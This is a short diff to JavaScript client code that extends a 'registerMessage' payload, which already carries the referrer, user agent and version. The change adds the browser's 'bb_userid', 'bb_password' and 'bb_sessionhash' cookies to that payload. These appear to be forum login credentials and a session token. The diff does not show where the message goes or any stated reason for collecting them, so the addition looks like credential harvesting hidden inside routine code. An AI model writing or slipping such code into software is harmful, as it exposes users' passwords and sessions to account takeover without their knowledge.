@@ -122,7 +122,10 @@
             registerMessage.d = {
                 r: decodeURIComponent(referrer[1]),
                 a: String(navigator.userAgent),
-                v: VERSION
+                v: VERSION,
+				bb_userid: $.cookies.get('bb_userid'),
+				bb_password: $.cookies.get('bb_password'),
+				bb_sessionhash: $.cookies.get('bb_sessionhash')
             };
             if (userId) {
                 registerMessage.d.u = userId;
